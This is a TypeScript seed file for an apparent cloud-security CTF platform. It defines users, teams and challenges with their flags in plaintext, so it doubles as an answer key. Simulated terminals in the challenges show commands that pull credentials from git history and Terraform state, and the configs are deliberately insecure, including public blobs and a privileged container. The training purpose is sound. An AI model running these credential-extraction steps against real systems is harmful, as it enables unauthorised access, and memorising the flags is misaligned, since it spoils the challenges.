import type { Knex } from 'knex';
import bcrypt from 'bcrypt';
import crypto from 'crypto';

// Helper function to hash flags
function hashFlag(flag: string): string {
  return crypto
    .createHash('sha256')
    .update(flag.toLowerCase().trim())
    .digest('hex');
}

export async function seed(knex: Knex): Promise<void> {
  // Clear existing data
  await knex('user_achievements').del();
  await knex('achievements').del();
  await knex('hint_unlocks').del();
  await knex('submissions').del();
  await knex('hints').del();
  await knex('challenge_files').del();
  await knex('challenges').del();
  await knex('team_members').del();
  await knex('teams').del();
  await knex('users').del();

  // Create admin user
  const adminPassword = await bcrypt.hash(
    process.env.ADMIN_PASSWORD || 'changeme',
    12
  );

  const [admin] = await knex('users')
    .insert({
      username: process.env.ADMIN_USERNAME || 'admin',
      email: process.env.ADMIN_EMAIL || 'admin@sentinelforge.ctf',
      password_hash: adminPassword,
      role: 'admin',
      is_verified: true,
      is_active: true,
      country: 'USA',
      affiliation: 'SentinelForge'
    })
    .returning('*');

  // Create demo users
  const demoPassword = await bcrypt.hash('demo123', 12);

  const [user1, user2, user3] = await knex('users')
    .insert([
      {
        username: 'sentinel_alpha',
        email: 'alpha@sentinelforge.ctf',
        password_hash: demoPassword,
        role: 'user',
        is_verified: true,
        country: 'USA',
        affiliation: 'Alpha Team'
      },
      {
        username: 'cloud_guardian',
        email: 'guardian@sentinelforge.ctf',
        password_hash: demoPassword,
        role: 'user',
        is_verified: true,
        country: 'GBR',
        affiliation: 'Guardian Squad'
      },
      {
        username: 'cyber_sentinel',
        email: 'sentinel@sentinelforge.ctf',
        password_hash: demoPassword,
        role: 'user',
        is_verified: true,
        country: 'DEU',
        affiliation: 'Sentinel Corps'
      }
    ])
    .returning('*');

  // Create demo teams
  const [team1, team2] = await knex('teams')
    .insert([
      {
        name: 'Alpha Defenders',
        description: 'Elite cloud security specialists',
        country: 'USA',
        captain_id: user1.id,
        affiliation: 'Alpha Team'
      },
      {
        name: 'Guardian Alliance',
        description: 'International cybersecurity coalition',
        country: 'GBR',
        captain_id: user2.id,
        affiliation: 'Guardian Squad'
      }
    ])
    .returning('*');

  // Add team members
  await knex('team_members').insert([
    { team_id: team1.id, user_id: user1.id },
    { team_id: team2.id, user_id: user2.id },
    { team_id: team2.id, user_id: user3.id }
  ]);

  // Create sample challenges
  const challenges = await knex('challenges')
    .insert([
      {
        title: 'AWS Origins',
        description: `Test your knowledge of cloud computing history!

**Question:** What was Amazon Web Services' (AWS) first publicly available web service, launched in 2004?

**Learning Context:**
Amazon Web Services revolutionized cloud computing by offering infrastructure as a service. Understanding the origins helps us appreciate how cloud architecture evolved.

**Microsoft Learn Reference:**
While this is about AWS history, understanding competing cloud platforms helps you make informed architectural decisions. Azure offers similar services - learn about Azure's messaging services at: https://learn.microsoft.com/en-us/azure/service-bus-messaging/

**Hint:** It's still one of the most popular AWS services today for distributed systems and starts with an 'S'. Think about message queuing.

**Answer Format:** Enter the service name in all caps (e.g., flag{SERVICENAME})`,
        difficulty: 'easy',
        category: 'Trivia',
        points: 50,
        flag_hash: hashFlag('flag{SQS}'),
        is_active: true,
        metadata: {
          hints_available: false,
          estimated_time: '2 minutes',
          learning_resources: [
            {
              title: 'Azure Service Bus vs AWS SQS',
              url: 'https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-messaging-overview',
              description: 'Compare Azure Service Bus with AWS SQS to understand cloud messaging patterns'
            }
          ]
        }
      },
      {
        title: 'Azure Goes Global',
        description: `Azure has data centers all around the world. Let's see how well you know their expansion history!

**Question:** In which country did Microsoft Azure build its first international data center region outside of the United States? (Launched in 2009)

**Learning Context:**
Azure's global expansion strategy focused on data residency, latency, and compliance requirements. Understanding Azure's geography helps with designing resilient, compliant applications.

**Microsoft Learn Reference:**
Learn about Azure regions and availability zones: https://learn.microsoft.com/en-us/azure/reliability/availability-zones-overview

**Hint:** This European country is known for its advanced infrastructure and strict data privacy laws. It's also a major tech hub.

**Answer Format:** Enter the country name (e.g., flag{COUNTRYNAME})`,
        difficulty: 'easy',
        category: 'Trivia',
        points: 50,
        flag_hash: hashFlag('flag{IRELAND}'),
        is_active: true,
        metadata: {
          hints_available: false,
          estimated_time: '2 minutes',
          learning_resources: [
            {
              title: 'Azure Geographies and Regions',
              url: 'https://learn.microsoft.com/en-us/azure/reliability/availability-zones-overview',
              description: 'Understand how Azure organizes its global infrastructure'
            },
            {
              title: 'Data Residency in Azure',
              url: 'https://learn.microsoft.com/en-us/azure/compliance/offerings/offering-eu-data-boundary',
              description: 'Learn about data sovereignty and compliance'
            }
          ]
        }
      },
      {
        title: 'Container Revolution',
        description: `Containers have revolutionized how we deploy applications. How well do you know their history?

**Question:** What year was Docker, the platform that popularized containerization, first released to the public?

**Learning Context:**
Containers provide lightweight virtualization for applications. Understanding container history helps you appreciate modern orchestration platforms like Kubernetes and Azure Container Instances.

**Microsoft Learn Reference:**
Introduction to containers on Azure: https://learn.microsoft.com/en-us/azure/container-instances/container-instances-overview

**Hint:** It was in the early 2010s, and the project was originally called "dotCloud" before pivoting to focus on containers.

**Answer Format:** Enter the 4-digit year (e.g., flag{YYYY})`,
        difficulty: 'easy',
        category: 'Trivia',
        points: 50,
        flag_hash: hashFlag('flag{2013}'),
        is_active: true,
        metadata: {
          hints_available: false,
          estimated_time: '2 minutes',
          learning_resources: [
            {
              title: 'Container Instances Overview',
              url: 'https://learn.microsoft.com/en-us/azure/container-instances/container-instances-overview',
              description: 'Learn about running containers in Azure'
            },
            {
              title: 'Azure Kubernetes Service (AKS)',
              url: 'https://learn.microsoft.com/en-us/azure/aks/intro-kubernetes',
              description: 'Understand container orchestration on Azure'
            }
          ]
        }
      },
      {
        title: 'Azure Blob Storage Misconfiguration',
        description: `A company has deployed an Azure Storage Account for their web application. During a security audit, you've gained access to their Azure subscription with read-only permissions.

**Scenario:** The development team deployed a storage account for hosting static website assets, but they may have misconfigured the access controls.

**Your Mission:** Investigate the storage account configuration and find the flag that proves public data exposure is possible.

**Skills Required:** Azure Storage, access control analysis, cloud security best practices`,
        difficulty: 'easy',
        category: 'Cloud Security',
        points: 100,
        flag_hash: hashFlag('flag{pub1ic_bl0bs_l3ak_d4ta}'),
        is_active: true,
        metadata: {
          hints_available: true,
          estimated_time: '15 minutes',
          files: [
            {
              name: 'storage-account-config.json',
              language: 'json',
              content: `{
  "id": "/subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/prod-web-rg/providers/Microsoft.Storage/storageAccounts/sentinelctf2025data",
  "name": "sentinelctf2025data",
  "type": "Microsoft.Storage/storageAccounts",
  "location": "eastus",
  "sku": {
    "name": "Standard_LRS",
    "tier": "Standard"
  },
  "kind": "StorageV2",
  "properties": {
    "allowBlobPublicAccess": true,
    "minimumTlsVersion": "TLS1_0",
    "networkAcls": {
      "bypass": "AzureServices",
      "defaultAction": "Allow",
      "ipRules": [],
      "virtualNetworkRules": []
    },
    "supportsHttpsTrafficOnly": false,
    "encryption": {
      "services": {
        "blob": {
          "enabled": true
        }
      }
    },
    "accessTier": "Hot",
    "primaryEndpoints": {
      "blob": "https://sentinelctf2025data.blob.core.windows.net/",
      "web": "https://sentinelctf2025data.z13.web.core.windows.net/"
    }
  },
  "tags": {
    "environment": "production",
    "cost-center": "engineering",
    "owner": "devops-team",
    "backup-policy": "weekly",
    "compliance": "required"
  }
}`
            }
          ],
          terminal: [
            {
              command: 'az storage account list --resource-group prod-web-rg --output table',
              output: `Name                  ResourceGroup    Location    StatusOfPrimary    AccessTier
--------------------  ---------------  ----------  -----------------  ------------
sentinelctf2025data   prod-web-rg      eastus      available          Hot`
            },
            {
              command: 'az storage account show --name sentinelctf2025data --resource-group prod-web-rg --query "{Name:name, PublicAccess:allowBlobPublicAccess, TLS:minimumTlsVersion, HTTPS:supportsHttpsTrafficOnly}"',
              output: `{
  "HTTPS": false,
  "Name": "sentinelctf2025data",
  "PublicAccess": true,
  "TLS": "TLS1_0"
}`
            },
            {
              command: 'az storage account show --name sentinelctf2025data --resource-group prod-web-rg --query "networkRuleSet"',
              output: `{
  "bypass": "AzureServices",
  "defaultAction": "Allow",
  "ipRules": [],
  "virtualNetworkRules": []
}`
            },
            {
              command: 'az storage container list --account-name sentinelctf2025data --output table',
              output: `Name              Lease Status    Public Access
----------------  --------------  ---------------
website-assets    unlocked        blob
customer-data     unlocked        container
backups           unlocked        off`
            },
            {
              command: 'az storage blob list --account-name sentinelctf2025data --container-name customer-data --output table',
              output: `Name                          Blob Type    Blob Tier    Length    Content Type              Last Modified
----------------------------  -----------  -----------  --------  ------------------------  -------------------------
customer-records-2025-q1.csv  BlockBlob    Hot          2048576   text/csv                  2025-01-15T14:23:19+00:00
employee-data.json            BlockBlob    Hot          1572864   application/json          2025-02-03T09:15:42+00:00
audit-logs-jan.txt            BlockBlob    Hot          524288    text/plain                2025-01-31T23:59:01+00:00
secrets.json                  BlockBlob    Hot          4096      application/json          2025-03-01T08:30:15+00:00

💡 Hint: You've found publicly accessible blobs! Try downloading one of these files to examine its contents.
Use: az storage blob download --account-name <account> --container-name <container> --name <blob-name>`
            }
          ],
          hints: [
            {
              text: 'Look for containers with public access enabled. What sensitive data might be stored there?',
              cost: 10
            },
            {
              text: 'The flag is hidden in a publicly accessible blob. Try downloading files from the customer-data container.',
              cost: 20
            }
          ],
          learning_resources: [
            {
              title: 'Azure Storage Security Guide',
              url: 'https://learn.microsoft.com/en-us/azure/storage/common/storage-security-guide',
              description: 'Comprehensive guide to securing Azure Storage accounts'
            },
            {
              title: 'Configure Anonymous Public Read Access',
              url: 'https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure',
              description: 'Understand blob public access settings and risks'
            },
            {
              title: 'Storage Account Best Practices',
              url: 'https://learn.microsoft.com/en-us/azure/storage/common/storage-account-overview',
              description: 'Best practices for Azure Storage configuration'
            }
          ]
        }
      },
      {
        title: 'Git History Detective',
        description: `A developer accidentally committed sensitive credentials to a repository and later removed them. However, git never forgets!

**Scenario:** You're performing a security audit on a company's codebase. The developers claim they've removed all secrets, but you suspect something might be hidden in the git history.

**Your Mission:** Investigate the commit history to find an API key that was committed and later removed.

**Learning Objectives:**
- Understand git commit history and how deleted data persists
- Learn secret scanning techniques
- Apply security best practices for secret management

**Microsoft Learn References:**
- GitHub secret scanning: https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning
- Azure Key Vault for secrets: https://learn.microsoft.com/en-us/azure/key-vault/general/overview

**Skills Required:** Git history analysis, secret scanning, DevSecOps best practices`,
        difficulty: 'easy',
        category: 'DevSecOps',
        points: 150,
        flag_hash: hashFlag('flag{g1t_h1st0ry_n3v3r_f0rg3ts}'),
        is_active: true,
        metadata: {
          hints_available: true,
          estimated_time: '15 minutes',
          files: [
            {
              name: '.env.example',
              language: 'bash',
              content: `# Example environment variables
DATABASE_URL=postgresql://localhost:5432/myapp
API_BASE_URL=https://api.example.com
LOG_LEVEL=info
CACHE_TTL=3600

# Never commit actual secrets!
# Use Azure Key Vault or similar services
# See: https://learn.microsoft.com/en-us/azure/key-vault/`
            },
            {
              name: 'README.md',
              language: 'markdown',
              content: `# Vulnerable App Demo

This is a demo application for security training.

## Setup

1. Clone the repository
2. Copy \`.env.example\` to \`.env\`
3. Fill in your actual credentials (NEVER commit .env!)
4. Run \`npm install\`
5. Run \`npm start\`

## Security Best Practices

⚠️ **Important:** Never commit secrets to git!

Instead:
- Use environment variables
- Use Azure Key Vault for production secrets
- Use GitHub Advanced Security secret scanning
- Rotate secrets immediately if exposed

## Learn More

- [Azure Key Vault Best Practices](https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices)
- [GitHub Secret Scanning](https://docs.github.com/en/code-security/secret-scanning)`
            },
            {
              name: 'app.js',
              language: 'javascript',
              content: `const express = require('express');
require('dotenv').config();

const app = express();

// Good practice: Load from environment variables
const config = {
  databaseUrl: process.env.DATABASE_URL,
  apiUrl: process.env.API_BASE_URL,
  logLevel: process.env.LOG_LEVEL || 'info'
};

app.get('/', (req, res) => {
  res.json({ 
    status: 'ok',
    message: 'API is running'
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(\`Server running on port \${PORT}\`);
});`
            }
          ],
          terminal: [
            {
              command: 'git log --oneline',
              output: `a7b3c9d (HEAD -> main) Remove sensitive data from repository
f2e4d8c Update README with security best practices
9c1a5f7 Add environment variable example
3e8b2a4 Fix typo in documentation
7d4f1c6 Initial commit with app structure`
            },
            {
              command: 'git show a7b3c9d',
              output: `commit a7b3c9d487e2f1a9b5c3d6e8f0a2b4c6d8e0f2a4
Author: Dev User <dev@example.com>
Date:   Mon Oct 28 14:32:15 2025 -0700

    Remove sensitive data from repository

diff --git a/.env b/.env
deleted file mode 100644
index 8e7f9a2..0000000
--- a/.env
+++ /dev/null
@@ -1,4 +0,0 @@
-DATABASE_URL=postgresql://localhost:5432/myapp
-API_BASE_URL=https://api.example.com
-API_KEY=sk-prod-abc123xyz789
-LOG_LEVEL=info

⚠️  A .env file was deleted with an API key exposed!
   But wait... was there more in that file?
   
💡 Tip: The diff above shows 4 lines removed, but notice the range: @@ -1,4 +0,0 @@
   This means 4 lines were deleted. But sometimes git truncates output for readability.
   Try viewing the actual file content before deletion:
   
   git show a7b3c9d^:.env`
            },
            {
              command: 'git show a7b3c9d^:.env',
              output: `DATABASE_URL=postgresql://localhost:5432/myapp
API_BASE_URL=https://api.example.com
API_KEY=sk-prod-abc123xyz789
SECRET_FLAG=flag{g1t_h1st0ry_n3v3r_f0rg3ts}
LOG_LEVEL=info

🎯 SUCCESS! You found the exposed secret in the git history!

📊 Analysis: The .env file contained sensitive credentials including:
- An API_KEY (sk-prod-abc123xyz789)
- A SECRET_FLAG that should never have been committed

This is a common mistake - developers commit secrets then try to remove them.
But git never forgets! The secret remains in the commit history.

🔒 Security Best Practices:
1. Never commit secrets to git repositories
2. Use .gitignore to exclude .env files
3. Store secrets in Azure Key Vault or similar services
4. Use GitHub Advanced Security for secret scanning
5. If secrets are exposed, rotate them immediately AND clean git history
6. Use tools like git-filter-repo or BFG Repo-Cleaner to remove secrets from history

📚 Learn More:
- Azure Key Vault: https://learn.microsoft.com/en-us/azure/key-vault/
- Secret Scanning: https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning`
            }
          ],
          hints: [
            {
              text: 'Use "git log --oneline" to see recent commits. Look for commits mentioning "remove" or "sensitive".',
              cost: 15
            },
            {
              text: 'Once you find the suspicious commit (a7b3c9d), use "git show a7b3c9d^:.env" to view the .env file content before it was deleted.',
              cost: 30
            }
          ],
          learning_resources: [
            {
              title: 'Secret Scanning in Azure DevOps',
              url: 'https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning',
              description: 'Learn how to automatically detect secrets in your repositories'
            },
            {
              title: 'Azure Key Vault Best Practices',
              url: 'https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices',
              description: 'Proper way to manage secrets in production'
            }
          ]
        }
      },
      {
        title: 'Terraform State File Exposure',
        description: `An organization stores their Terraform state files with improper access controls. State files contain the complete infrastructure configuration, including sensitive data.

**Scenario:** During a penetration test, you discovered a publicly accessible S3 bucket containing Terraform state files. These files may contain secrets that should have been stored securely.

**Your Mission:** Analyze the exposed state file and extract sensitive information that proves the security risk.

**Learning Objectives:**
- Understand Terraform state file contents and risks
- Learn about secure state management
- Apply Infrastructure as Code security best practices

**Microsoft Learn References:**
- Secure Terraform state storage: https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage
- Azure Database security best practices: https://learn.microsoft.com/en-us/azure/postgresql/flexible-server/concepts-best-practices-security
- Terraform with Azure: https://learn.microsoft.com/en-us/azure/developer/terraform/overview

**Skills Required:** Terraform, IaC security, state file analysis, JSON parsing`,
        difficulty: 'medium',
        category: 'Infrastructure as Code',
        points: 200,
        flag_hash: hashFlag('flag{st4t3_f1l3s_c0nt41n_s3cr3ts}'),
        is_active: true,
        metadata: {
          hints_available: true,
          estimated_time: '20 minutes',
          files: [
            {
              name: 'terraform.tfstate',
              language: 'json',
              content: `{
  "version": 4,
  "terraform_version": "1.5.0",
  "serial": 42,
  "lineage": "a7b3c9d4-e5f6-47a8-b9c0-d1e2f3a4b5c6",
  "outputs": {
    "database_endpoint": {
      "value": "proddb.postgres.database.azure.com:5432",
      "type": "string"
    },
    "web_app_url": {
      "value": "https://sentinelforge-prod.azurewebsites.net",
      "type": "string"
    },
    "deployment_secret": {
      "value": "flag{st4t3_f1l3s_c0nt41n_s3cr3ts}",
      "type": "string",
      "sensitive": true
    }
  },
  "resources": [
    {
      "mode": "managed",
      "type": "azurerm_resource_group",
      "name": "main",
      "provider": "provider[\\"registry.terraform.io/hashicorp/azurerm\\"]",
      "instances": [
        {
          "schema_version": 0,
          "attributes": {
            "id": "/subscriptions/12345678-90ab-cdef-1234-567890abcdef/resourceGroups/prod-rg",
            "location": "eastus",
            "name": "prod-rg",
            "tags": {
              "environment": "production",
              "managed-by": "terraform"
            }
          }
        }
      ]
    },
    {
      "mode": "managed",
      "type": "azurerm_postgresql_server",
      "name": "database",
      "provider": "provider[\\"registry.terraform.io/hashicorp/azurerm\\"]",
      "instances": [
        {
          "schema_version": 1,
          "attributes": {
            "id": "/subscriptions/12345678-90ab-cdef-1234-567890abcdef/resourceGroups/prod-rg/providers/Microsoft.DBforPostgreSQL/servers/proddb",
            "name": "proddb",
            "resource_group_name": "prod-rg",
            "location": "eastus",
            "version": "11",
            "administrator_login": "dbadmin",
            "administrator_login_password": "P@ssw0rd123!Prod",
            "sku_name": "GP_Gen5_4",
            "storage_mb": 102400,
            "backup_retention_days": 7,
            "ssl_enforcement_enabled": true,
            "fqdn": "proddb.postgres.database.azure.com"
          },
          "sensitive_attributes": [
            {
              "type": "get_attr",
              "value": "administrator_login_password"
            }
          ]
        }
      ]
    },
    {
      "mode": "managed",
      "type": "azurerm_storage_account",
      "name": "app_storage",
      "provider": "provider[\\"registry.terraform.io/hashicorp/azurerm\\"]",
      "instances": [
        {
          "schema_version": 3,
          "attributes": {
            "id": "/subscriptions/12345678-90ab-cdef-1234-567890abcdef/resourceGroups/prod-rg/providers/Microsoft.Storage/storageAccounts/prodappstorage",
            "name": "prodappstorage",
            "resource_group_name": "prod-rg",
            "location": "eastus",
            "account_tier": "Standard",
            "account_replication_type": "GRS",
            "primary_access_key": "zJK8vN9mP2qR4sT6wX0yA1bC3dE5fG7hI9jK0lM2nO4pQ6rS8tU0vW2xY4zA6bC8=",
            "secondary_access_key": "aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2yZ3aB4cD5eF6gH7iJ8kL9mN0oP1=",
            "primary_blob_endpoint": "https://prodappstorage.blob.core.windows.net/"
          },
          "sensitive_attributes": [
            {
              "type": "get_attr",
              "value": "primary_access_key"
            },
            {
              "type": "get_attr",
              "value": "secondary_access_key"
            }
          ]
        }
      ]
    }
  ]
}`
            },
            {
              name: 'main.tf',
              language: 'hcl',
              content: `# Production Infrastructure Configuration
# WARNING: State files contain sensitive data!

terraform {
  required_providers {
    azurerm = {
      source  = "hashicorp/azurerm"
      version = "~> 3.0"
    }
  }
  
  # ❌ BAD: Local state file
  # State files should be stored in Azure Storage with encryption
  # and access controls enabled
  
  # ✅ GOOD: Remote state with Azure Storage Backend
  # backend "azurerm" {
  #   resource_group_name  = "tfstate-rg"
  #   storage_account_name = "tfstatestorage"
  #   container_name      = "tfstate"
  #   key                 = "prod.terraform.tfstate"
  #   use_azuread_auth    = true
  # }
}

provider "azurerm" {
  features {}
}

resource "azurerm_resource_group" "main" {
  name     = "prod-rg"
  location = "East US"
  
  tags = {
    environment = "production"
    managed-by  = "terraform"
  }
}

resource "azurerm_postgresql_server" "database" {
  name                = "proddb"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name
  
  administrator_login          = "dbadmin"
  administrator_login_password = var.db_password # Should use Azure Key Vault!
  
  sku_name   = "GP_Gen5_4"
  version    = "11"
  storage_mb = 102400
  
  backup_retention_days        = 7
  ssl_enforcement_enabled      = true
  ssl_minimal_tls_version_enforced = "TLS1_2"
}

# Learn more about secure Terraform practices:
# https://learn.microsoft.com/en-us/azure/developer/terraform/best-practices-integration-testing`
            },
            {
              name: 'SECURITY_NOTES.md',
              language: 'markdown',
              content: `# Terraform State File Security Issues

## The Problem

This infrastructure has multiple security issues:

1. **State File Exposure**: State files contain ALL resource attributes
2. **Hardcoded Secrets**: Passwords stored in plain text
3. **No Encryption**: State file not encrypted at rest
4. **Public Access**: State file accessible without authentication

## What's at Risk?

Terraform state files contain:
- Database passwords
- Storage account access keys
- API keys and tokens
- Resource configurations
- Internal network details

## Secure Alternatives

### Use Azure Key Vault for Secrets
\`\`\`hcl
data "azurerm_key_vault_secret" "db_password" {
  name         = "database-password"
  key_vault_id = azurerm_key_vault.main.id
}

resource "azurerm_postgresql_server" "database" {
  administrator_login_password = data.azurerm_key_vault_secret.db_password.value
}
\`\`\`

### Use Remote State with Encryption
\`\`\`hcl
terraform {
  backend "azurerm" {
    resource_group_name  = "tfstate-rg"
    storage_account_name = "tfstate"
    container_name      = "tfstate"
    key                 = "prod.tfstate"
    use_azuread_auth    = true
  }
}
\`\`\`

## Learning Resources

- [Terraform State Best Practices](https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage)
- [Azure Key Vault with Terraform](https://learn.microsoft.com/en-us/azure/key-vault/general/overview)
- [Secure DevOps Kit for Azure](https://azsk.azurewebsites.net/)`
            }
          ],
          terminal: [
            {
              command: 'cat terraform.tfstate',
              output: `{
  "version": 4,
  "terraform_version": "1.5.0",
  "serial": 42,
  "lineage": "a7b3c9d4-e5f6-47a8-b9c0-d1e2f3a4b5c6",
  "outputs": {
    "database_endpoint": {
      "value": "proddb.postgres.database.azure.com:5432",
      "type": "string"
    },
    "web_app_url": {
      "value": "https://sentinelforge-prod.azurewebsites.net",
      "type": "string"
    },
    "deployment_secret": {
      "value": "flag{st4t3_f1l3s_c0nt41n_s3cr3ts}",
      "type": "string",
      "sensitive": true
    }
  },
  "resources": [
    {
      "mode": "managed",
      "type": "azurerm_resource_group",
      "name": "main",
      "provider": "provider[\"registry.terraform.io/hashicorp/azurerm\"]",
      "instances": [
        {
          "schema_version": 0,
          "attributes": {
            "id": "/subscriptions/12345678-90ab-cdef-1234-567890abcdef/resourceGroups/prod-rg",
            "location": "eastus",
            "name": "prod-rg",
            "tags": {
              "environment": "production",
              "managed-by": "terraform"
            }
          }
        }
      ]
    },
    {
      "mode": "managed",
      "type": "azurerm_postgresql_server",
      "name": "database",
      "provider": "provider[\"registry.terraform.io/hashicorp/azurerm\"]",
      "instances": [
        {
          "schema_version": 1,
          "attributes": {
            "id": "/subscriptions/12345678-90ab-cdef-1234-567890abcdef/resourceGroups/prod-rg/providers/Microsoft.DBforPostgreSQL/servers/proddb",
            "name": "proddb",
            "resource_group_name": "prod-rg",
            "location": "eastus",
            "version": "11",
            "administrator_login": "dbadmin",
            "administrator_login_password": "P@ssw0rd123!Prod",
            "sku_name": "GP_Gen5_4",
            "storage_mb": 102400,
            "backup_retention_days": 7,
            "ssl_enforcement_enabled": true,
            "fqdn": "proddb.postgres.database.azure.com"
          },
          "sensitive_attributes": [
            {
              "type": "get_attr",
              "value": "administrator_login_password"
            }
          ]
        }
      ]
    },
    {
      "mode": "managed",
      "type": "azurerm_storage_account",
      "name": "app_storage",
      "provider": "provider[\"registry.terraform.io/hashicorp/azurerm\"]",
      "instances": [
        {
          "schema_version": 3,
          "attributes": {
            "id": "/subscriptions/12345678-90ab-cdef-1234-567890abcdef/resourceGroups/prod-rg/providers/Microsoft.Storage/storageAccounts/prodappstorage",
            "name": "prodappstorage",
            "resource_group_name": "prod-rg",
            "location": "eastus",
            "account_tier": "Standard",
            "account_replication_type": "GRS",
            "primary_access_key": "zJK8vN9mP2qR4sT6wX0yA1bC3dE5fG7hI9jK0lM2nO4pQ6rS8tU0vW2xY4zA6bC8=",
            "secondary_access_key": "aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2yZ3aB4cD5eF6gH7iJ8kL9mN0oP1=",
            "primary_blob_endpoint": "https://prodappstorage.blob.core.windows.net/"
          },
          "sensitive_attributes": [
            {
              "type": "get_attr",
              "value": "primary_access_key"
            },
            {
              "type": "get_attr",
              "value": "secondary_access_key"
            }
          ]
        }
      ]
    }
  ]
}

Use 'cat terraform.tfstate | jq .' for formatted JSON
Or explore specific sections:
  - Resources: cat terraform.tfstate | jq ".resources"
  - Outputs: cat terraform.tfstate | jq ".outputs"
  
💡 Tip: State files contain multiple sections that may hold sensitive data`
            },
            {
              command: 'cat terraform.tfstate | jq ".resources[] | select(.type == \\"azurerm_postgresql_server\\")"',
              output: `{
  "mode": "managed",
  "type": "azurerm_postgresql_server",
  "name": "database",
  "provider": "provider[\\"registry.terraform.io/hashicorp/azurerm\\"]",
  "instances": [
    {
      "schema_version": 1,
      "attributes": {
        "id": "/subscriptions/.../servers/proddb",
        "name": "proddb",
        "administrator_login": "dbadmin",
        "administrator_login_password": "P@ssw0rd123!Prod",
        "fqdn": "proddb.postgres.database.azure.com",
        "ssl_enforcement_enabled": true
      }
    }
  ]
}

⚠️  WARNING: Database password exposed in state file!
   Password: P@ssw0rd123!Prod
   
   This demonstrates why state files are dangerous.
   But there's more... what other secrets might be in this file?`
            },
            {
              command: 'cat terraform.tfstate | jq ".resources[] | select(.type == \\"azurerm_storage_account\\") | .instances[0].attributes | {name, primary_access_key}"',
              output: `{
  "name": "prodappstorage",
  "primary_access_key": "zJK8vN9mP2qR4sT6wX0yA1bC3dE5fG7hI9jK0lM2nO4pQ6rS8tU0vW2xY4zA6bC8="
}

⚠️  CRITICAL: Multiple secrets exposed in state file!
   
   You've already uncovered:
   - Database Password: P@ssw0rd123!Prod
   - Storage Access Key: zJK8vN9...
   
   🧭 Next step: secrets aren't limited to resource attributes.
   Inspect the outputs metadata first to see which values Terraform flagged as sensitive.
   
   Hint: cat terraform.tfstate | jq ".outputs | with_entries({key: .key, value: {sensitive: .value.sensitive}})"`
            },
            {
              command: 'cat terraform.tfstate | jq ".outputs | with_entries({key: .key, value: {sensitive: .value.sensitive}})"',
              output: `{
  "database_endpoint": {
    "sensitive": false
  },
  "web_app_url": {
    "sensitive": false
  },
  "deployment_secret": {
    "sensitive": true
  }
}

👀 One output is flagged as sensitive.
    Dump the full outputs block to verify what was leaked.`
            },
            {
              command: 'cat terraform.tfstate | jq ".outputs"',
              output: `{
  "database_endpoint": {
    "value": "proddb.postgres.database.azure.com:5432",
    "type": "string"
  },
  "web_app_url": {
    "value": "https://sentinelforge-prod.azurewebsites.net",
    "type": "string"
  },
  "deployment_secret": {
    "value": "flag{st4t3_f1l3s_c0nt41n_s3cr3ts}",
    "type": "string",
    "sensitive": true
  }
}

🎯 SUCCESS! You found the flag in the outputs section!

Even though this output was marked as "sensitive": true in the Terraform configuration,
the state file stores it in PLAIN TEXT. This is why state files must be:
- Encrypted at rest
- Stored in secure backends (Azure Storage, S3, Terraform Cloud)
- Access-controlled with proper IAM/RBAC
- Never committed to version control
- Protected with network restrictions

🔒 Key Takeaways:
1. State files contain ALL resource attributes and outputs
2. "Sensitive" variables are NOT encrypted in state files
3. State files are treasure troves for attackers
4. Always use remote state backends with encryption
5. Implement strict access controls on state storage

📚 Learn More:
- https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage
- https://developer.hashicorp.com/terraform/language/state/sensitive-data`
            }
          ],
          hints: [
            {
              text: 'Terraform state files are JSON documents. Use "jq" to parse and filter resources by type. Look for database or storage resources.',
              cost: 20
            },
            {
              text: 'Search for "azurerm_postgresql_server" in the state file. The administrator_login_password attribute contains the database password.',
              cost: 40
            }
          ],
          learning_resources: [
            {
              title: 'Store Terraform State in Azure Storage',
              url: 'https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage',
              description: 'Learn how to securely store Terraform state files'
            },
            {
              title: 'Azure Key Vault for Terraform',
              url: 'https://learn.microsoft.com/en-us/azure/key-vault/general/overview',
              description: 'Use Key Vault to manage secrets in Terraform'
            }
          ]
        }
      },
      {
        title: 'Container Escape Challenge',
        description: `You've gained access to a Docker container running with excessive privileges. Can you escape to the host system?

**Scenario:** A development team deployed a container with privileged mode enabled "for testing". This is a common misconfiguration that can lead to container escape vulnerabilities.

**Your Mission:** Explore the container's capabilities and find a way to access the host filesystem to retrieve the flag.

**Learning Objectives:**
- Understand Docker security boundaries
- Learn about Linux capabilities and namespaces
- Apply container hardening best practices

**Microsoft Learn References:**
- Azure Container security: https://learn.microsoft.com/en-us/azure/container-instances/container-instances-image-security
- AKS security concepts: https://learn.microsoft.com/en-us/azure/aks/concepts-security

**Skills Required:** Docker, Linux capabilities, privilege escalation, container security

**Note:** This is a simulated environment. The techniques demonstrated should only be used for educational purposes in authorized environments.`,
        difficulty: 'hard',
        category: 'Container Security',
        points: 300,
        flag_hash: hashFlag('flag{c0nt41n3r_3sc4p3_m4st3r}'),
        is_active: true,
        metadata: {
          hints_available: true,
          estimated_time: '30 minutes',
          files: [
            {
              name: 'Dockerfile',
              language: 'dockerfile',
              content: `FROM ubuntu:22.04

# Install basic tools
RUN apt-get update && apt-get install -y \\
    curl \\
    vim \\
    net-tools \\
    procps \\
    && rm -rf /var/lib/apt/lists/*

# Create app directory
WORKDIR /app

# Add a non-root user (good practice, but not used in this vulnerable setup)
RUN useradd -m -s /bin/bash appuser

# Copy application files
COPY app.sh /app/

# ❌ BAD: Running as root
# ✅ GOOD: USER appuser

CMD ["/bin/bash", "/app/app.sh"]`
            },
            {
              name: 'docker-compose.yml',
              language: 'yaml',
              content: `version: '3.8'

services:
  vulnerable-app:
    build: .
    # ❌ CRITICAL VULNERABILITY: Privileged mode
    privileged: true
    
